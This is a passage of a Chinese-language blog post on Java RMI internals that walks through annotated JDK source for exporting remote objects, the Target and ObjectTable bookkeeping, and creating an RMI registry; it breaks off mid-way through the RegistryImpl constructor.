&lt;li&gt;toString：打印包含远程引用信息的字符串，便于排查。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Ann Wollrath</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Laird Dornin</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Peter Jones</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>       JDK1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RemoteObject</span> <span class="keyword">implements</span> <span class="title class_">java</span>.rmi.Remote, java.io.Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 远程对象引用：封装了对象标识与网络终端信息，供远程调用时使用 */</span></span><br><span class="line">    <span class="keyword">protected</span> RemoteRef ref;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用给定的远程引用构造远程对象基类。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> newref 远程引用（不可为 null；通常由导出流程注入）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteObject</span><span class="params">(RemoteRef newref)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.ref = newref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提示：在 JDK 标准实现中，这个类还会覆写 equals/hashCode/toString，</span></span><br><span class="line">    <span class="comment">// 并实现 Externalizable/序列化相关细节，以保证远程对象的“远程语义”一致性。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>创建完动态代理后 <code>UnicastServerRef#exportObject</code> 函数又有如下过程：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3) 若采用“旧式 stub”（RemoteStub），则设置服务器“骨架（skeleton）”</span></span><br><span class="line"><span class="comment">//    - skeleton 仅用于 JDK 1.1 时代的旧协议分发；现代客户端（动态代理）不依赖它。</span></span><br><span class="line"><span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">    setSkeleton(impl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) 构造 Target：这是服务端的聚合描述，包含</span></span><br><span class="line"><span class="comment">//    - impl：远程对象实现</span></span><br><span class="line"><span class="comment">//    - this：调度器/分发器（当前 UnicastServerRef）</span></span><br><span class="line"><span class="comment">//    - stub：客户端要拿到的代理</span></span><br><span class="line"><span class="comment">//    - ref.getObjID()：对象 ID（JRMP 里的唯一标识）</span></span><br><span class="line"><span class="comment">//    - permanent：生命周期策略（是否参与 DGC）</span></span><br><span class="line"><span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5) 通过传输层引用 ref 真正“导出”目标：</span></span><br><span class="line"><span class="comment">//    - 绑定对象 ID → Target</span></span><br><span class="line"><span class="comment">//    - 打开/注册监听（若尚未）</span></span><br><span class="line"><span class="comment">//    - 准备好入站调用的分发</span></span><br><span class="line">ref.exportObject(target);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6) 为 JRMP 的方法分发准备“方法哈希→Method”的映射缓存</span></span><br><span class="line"><span class="comment">//    - JRMP 通过方法签名哈希（long）标识远程调用的方法，此表用于快速从哈希反查到反射 Method。</span></span><br><span class="line">hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7) 返回客户端要使用的 stub（调用方通常会把它注册到 RMI Registry）</span></span><br><span class="line"><span class="keyword">return</span> stub;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>由于创建的存根是远程对象的代理类而不是 <code>RemoteStub</code> 的示例，因此不调用 <code>setSkeleton</code> 函数。</li>
<li>创建了一个 <code>sun.rmi.transport.Target</code> 对象用来保存远程对象的信息。</li>
<li>通过 <code>UnicastServerRef#exportObject</code> 方法将 <code>target</code> 对象导出。</li>
<li>更新 <code>hashToMethod_Map</code>。这里 <code>hashToMethod_Map</code> 存储的是<strong>方法哈希</strong>和<strong>方法</strong>的对应关系，后面远程调用是根据方法哈希找到方法的。</li>
<li>返回存根，即远程对象的动态代理。</li>
</ol>
<p>其中 <code>sun.rmi.transport.Target</code> 的构造函数如下，这里要注意初始化的成员变量及其含义，后面会用到。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为远程实现对象 &#123;<span class="doctag">@code</span> impl&#125; 构造一个“服务端目标（Target）”条目，并与给定的</span></span><br><span class="line"><span class="comment"> * 唯一对象标识 &#123;<span class="doctag">@link</span> ObjID&#125; 绑定。Target 用于在传输/分发层跟踪并路由入站的</span></span><br><span class="line"><span class="comment"> * 远程调用：网络请求到达后由分发器将其转为对 &#123;<span class="doctag">@code</span> impl&#125; 的本地方法调用，</span></span><br><span class="line"><span class="comment"> * 而客户端持有的存根（stub）内部携带可到达本 Target 的远程引用信息。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;参数含义：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;impl&lt;/b&gt;：远程对象的“真实实现”（必须实现 &#123;<span class="doctag">@link</span> java.rmi.Remote&#125;），实际执行业务逻辑。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;disp&lt;/b&gt;：分发器/调度器（通常为 &#123;<span class="doctag">@code</span> UnicastServerRef&#125;），负责把入站请求分派到 &#123;<span class="doctag">@code</span> impl&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;stub&lt;/b&gt;：客户端将得到的远程代理；其内部包含指向本 Target 的远程引用信息。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;id&lt;/b&gt;：此远程对象在 JRMP 里的唯一标识（对象 ID），用于路由与定位。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;&lt;b&gt;permanent&lt;/b&gt;：是否“永久导出”。为 &#123;<span class="doctag">@code</span> true&#125; 时通常不参与分布式 GC 的租约回收，</span></span><br><span class="line"><span class="comment"> *       对象在无远程引用时也不会被自动 unexport（具体行为视实现而定）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Target</span><span class="params">(Remote impl, Dispatcher disp, Remote stub, ObjID id, <span class="type">boolean</span> permanent)</span> &#123;</span><br><span class="line">    <span class="comment">// [...] 这里通常会做参数校验、记录 impl、permanent 等状态</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 负责把入站的网络调用分派到 impl 的分发器</span></span><br><span class="line">    <span class="built_in">this</span>.disp = disp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 客户端可使用的远程代理（序列化到客户端侧）</span></span><br><span class="line">    <span class="built_in">this</span>.stub = stub;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 远程对象的唯一标识，用于路由与查表</span></span><br><span class="line">    <span class="built_in">this</span>.id = id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...] 这里通常还会初始化导出状态、访问控制上下文、类加载器/上下文类加载器等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外 <code>UnicastServerRef#exportObject</code> 有如下调用链：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UnicastServerRef#exportObject</span><br><span class="line">    TCPEndpoint#exportObject</span><br><span class="line">        TCPTransport#exportObject</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>TCPTransport#exportObject</code> 函数代码逻辑如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 导出（register）一个目标对象，使其可以接收来自客户端的远程调用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 生命周期/并发要点：</span></span><br><span class="line"><span class="comment"> * - 使用“监听器引用计数”（exportCount）来管理服务器监听套接字的开启/关闭。</span></span><br><span class="line"><span class="comment"> *   当 exportCount 从 0→1 时启动监听；当从 1→0 时（在其它位置）才会关闭监听。</span></span><br><span class="line"><span class="comment"> * - 这里先在同步块内确保监听已开启并递增计数，然后再尝试把 Target 注册到</span></span><br><span class="line"><span class="comment"> *   导出表（ObjID → Target 的查找表）中；若注册失败，会回滚计数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 1) 进入临界区：确保“开启监听 + 计数递增”是一个原子动作，</span></span><br><span class="line"><span class="comment">     *    避免与并发的 unexport（可能在计数归零时关闭监听）发生竞态。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        listen();      <span class="comment">// 懒加载/幂等：确保服务器套接字与接收线程已启动</span></span><br><span class="line">        exportCount++; <span class="comment">// 引用计数 +1：表示又有一个对象处于已导出状态</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 2) 尝试把 Target 注册到导出表（供分发层通过 ObjID 查找），</span></span><br><span class="line"><span class="comment">     *    如果任一步骤抛异常（例如重复导出、传输层异常），需要回滚计数。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">// 标志位：只有完全成功时才维持计数；否则在 finally 回滚</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.exportObject(target); <span class="comment">// 父类完成真正的“注册/绑定”动作（可能抛出异常）</span></span><br><span class="line">        ok = <span class="literal">true</span>;                  <span class="comment">// 全流程成功：维持计数不变</span></span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">            <span class="comment">// 3) 失败回滚：把前面加过的引用计数减回去。</span></span><br><span class="line">            <span class="comment">//    这里也放在同步块中，避免与其它导出/取消导出并发修改计数产生竞态。</span></span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                decrementExportCount(); <span class="comment">// 若计数归零，内部可能触发关闭监听</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该函数首先调用 <code>listen()</code> 函数为 <code>stub</code> 开启随机端口，之后调用 <code>Transport#exportObject</code>将 <code>target</code> 注册到 <code>ObjectTable</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将目标对象导出到传输层，使其能够接收来自客户端的入站调用。</span></span><br><span class="line"><span class="comment"> * 这里是 TCP 传输的导出入口（精简版逻辑）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 1) 记录“该 Target 是由哪个传输实现导出的”，以便后续反向查找/回收</span></span><br><span class="line">    target.setExportedTransport(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 将 Target 注册到全局对象表：建立 ObjID/实现 ↔ Target 的双向索引，</span></span><br><span class="line">    <span class="comment">//    并根据是否永久对象调整“保活计数/回收线程”状态。</span></span><br><span class="line">    ObjectTable.putTarget(target);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将 Target 加入对象表（ObjectTable），使其可被 ObjID 查找到并接受远程调用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 线程/生命周期要点：</span></span><br><span class="line"><span class="comment"> * - 使用 tableLock 保护 objTable/implTable 的一致性；</span></span><br><span class="line"><span class="comment"> * - 若实现对象已被 GC 回收（弱引用失效），直接跳过，不再导出（见 6597112）；</span></span><br><span class="line"><span class="comment"> * - 对非永久对象，递增 keep-alive 计数，必要时确保“回收线程/保活机制”处于运行状态，</span></span><br><span class="line"><span class="comment"> *   以清理失效条目并避免 JVM 提前退出。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putTarget</span><span class="params">(Target target)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">    <span class="comment">// “对象端点”：包含 ObjID + 传输层地址（endpoint）等信息，作为对象表主键</span></span><br><span class="line">    <span class="type">ObjectEndpoint</span> <span class="variable">oe</span> <span class="operator">=</span> target.getObjectEndpoint();</span><br><span class="line">    <span class="comment">// 指向实现对象的弱引用，用于检测实现是否被 GC 回收（避免强引用导致内存泄漏）</span></span><br><span class="line">    <span class="type">WeakRef</span> <span class="variable">weakImpl</span> <span class="operator">=</span> target.getWeakImpl();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        DGCImpl.dgcLog.log(Log.VERBOSE, <span class="string">&quot;add object &quot;</span> + oe);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用全局锁保护对象表的并发更新</span></span><br><span class="line">    <span class="keyword">synchronized</span> (tableLock) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 若实现对象已被回收，则不进行导出（避免在 null 检查与 put 之间被回收的竞态）。</span></span><br><span class="line"><span class="comment">         * 在持有 tableLock 时执行该检查与后续插入，保证弱引用失效不会在其间被回收线程处理。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (target.getImpl() != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 1) 冲突检测：同一个 ObjID 不可重复导出</span></span><br><span class="line">            <span class="keyword">if</span> (objTable.containsKey(oe)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;internal error: ObjID already in use&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 2) 同一个实现对象不可被“重复导出”为不同 Target（通常是一对象一导出）</span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (implTable.containsKey(weakImpl)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;object already exported&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3) 建立双向索引：</span></span><br><span class="line">            <span class="comment">//    - objTable：ObjectEndpoint → Target（入站请求用 ObjID 查 Target）</span></span><br><span class="line">            <span class="comment">//    - implTable：WeakRef(impl) → Target（便于根据实现对象进行管理/回收）</span></span><br><span class="line">            objTable.put(oe, target);</span><br><span class="line">            implTable.put(weakImpl, target);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4) 非永久对象需要“保活”：递增计数，确保回收/保活线程运行</span></span><br><span class="line">            <span class="keyword">if</span> (!target.isPermanent()) &#123;</span><br><span class="line">                incrementKeepAliveCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从最 <code>putTarget</code> 的实现可以看出，<code>target</code> 是被放入 <code>objTable</code> 和 <code>implTable</code> 中。从键 <code>oe</code>、<code>weakImpl</code> 可以看出，<code>ObjectTable</code> 提供 <code>ObjectEndpoint</code> 和 <code>Remote</code> 实例两种方式来查找 <code>Target</code>。</p>
<p>远程对象创建过程可以总结为下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/08/25/Java%20RMI%20&%20JNDI/images/exportObject.png"
                      alt="img"
                ></p>
<ul>
<li>远程对象继承 <code>UnicastRemoteObject</code>，<code>exportObject</code> 用于将这个对象导出，每个远程对象都有对应的远程引用（<code>UnicastServerRef</code>）。</li>
<li>对象导出是指，创建远程对象的动态代理，并将对象的方法和方法哈希存储到远程引用的 <code>hashToMethod_Map</code> 里，后面客户端通过传递方法哈希来找到对应的方法。同时开启一个 <code>socket</code> 监听到来的请求。远程对象、动态代理和对象 <code>id</code> 被封装为 <code>Target</code>，<code>target</code> 会被存储到 <code>TCPTransport</code> 的 <code>objTables</code> 里，后面客户端通过传递对象 <code>id</code> 可获取到对应 <code>target</code>。</li>
<li>动态代理 <code>Stub</code> 中含有这个远程对象的联系方式（<code>LiveRef</code>，包括主机、端口、对象<code>id</code>）。</li>
</ul>
<h4 id="注册中心创建"><a href="#注册中心创建" class="headerlink" title="注册中心创建"></a>注册中心创建</h4><p>在代码中，我们通常使用 <code>java.rmi.registry.LocateRegistry#createRegistry</code> 来创建注册中心：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br></pre></td></tr></table></figure></div>

<p><code>createRegistry</code> 方法实际创建了一个 <code>RegistryImpl</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在本地主机上创建并“导出”一个 &#123;<span class="doctag">@code</span> Registry&#125; 实例，使其在指定 &#123;<span class="doctag">@code</span> port&#125;</span></span><br><span class="line"><span class="comment"> * 上接受远程请求（等价于在当前 JVM 内启动一个内置的 RMI 注册中心）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;导出过程本质上与调用</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> java.rmi.server.UnicastRemoteObject#exportObject(Remote, int)&#125;</span></span><br><span class="line"><span class="comment"> * 类似：把一个 &#123;<span class="doctag">@code</span> RegistryImpl&#125; 实例作为远程对象在给定端口上导出。</span></span><br><span class="line"><span class="comment"> * 唯一的区别是：注册中心这个远程对象使用了一个“**预定义的对象标识**”</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> java.rmi.server.ObjID#REGISTRY_ID&#125;，以保证 RMI 运行时能用固定的 ObjID</span></span><br><span class="line"><span class="comment"> * 精确定位到该注册中心对象。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;注意&lt;/b&gt;：</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;这是“**进程内**”创建注册中心，不需要外部启动 &#123;<span class="doctag">@code</span> rmiregistry&#125; 可执行程序。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若 &#123;<span class="doctag">@code</span> port&#125; 为 0，将使用匿名端口（调试可用，但对外服务通常应使用固定端口，</span></span><br><span class="line"><span class="comment"> *       默认习惯端口为 1099）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;当端口被占用、套接字创建失败或权限受限时会抛出 &#123;<span class="doctag">@link</span> RemoteException&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 注册中心监听的 TCP 端口；0 表示匿名端口</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 已导出的注册中心远程对象（实现了 &#123;<span class="doctag">@link</span> java.rmi.registry.Registry&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 若导出失败（端口占用、网络/权限问题等）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> JDK 1.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">// 构造并导出一个 RegistryImpl；其父类/内部会完成 Unicast 导出与固定 ObjID 绑定</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>RegistryImpl</code> 的构造方法首先创建 <code>LiveRef</code> 对象，然后创建 <code>UnicastServerRef</code> 对象，最后调用 <code>setup</code> 进行配置。这里 <code>LiveRef</code> 传入的 <code>id</code> 为 0。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注册中心使用的“预定义对象编号”（ObjID 常量）。</span></span><br><span class="line"><span class="comment"> * RMI 运行时依靠这个固定的 ObjID 来唯一定位本地进程内的 Registry 实例。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">REGISTRY_ID</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * Registry 的固定对象标识：等价于 new ObjID(0)。</span></span><br><span class="line"><span class="comment"> * 客户端在不知道对象具体引用的情况下，也能通过该 ObjID 与服务器端的注册中心通信。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在指定端口上构造一个新的 RegistryImpl，并完成服务端导出所需的 ServerRef 初始化。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> port 监听端口（典型为 1099，即 Registry.REGISTRY_PORT；0 表示匿名端口）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 初始化/导出失败时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果使用“默认注册中心端口”且启用了 SecurityManager，则仅对该端口授予临时权限。</span></span><br><span class="line">    <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 以最小权限运行：只在本 doPrivileged 块内临时授予对 localhost:port 的 listen/accept 权限</span></span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Void <span class="title 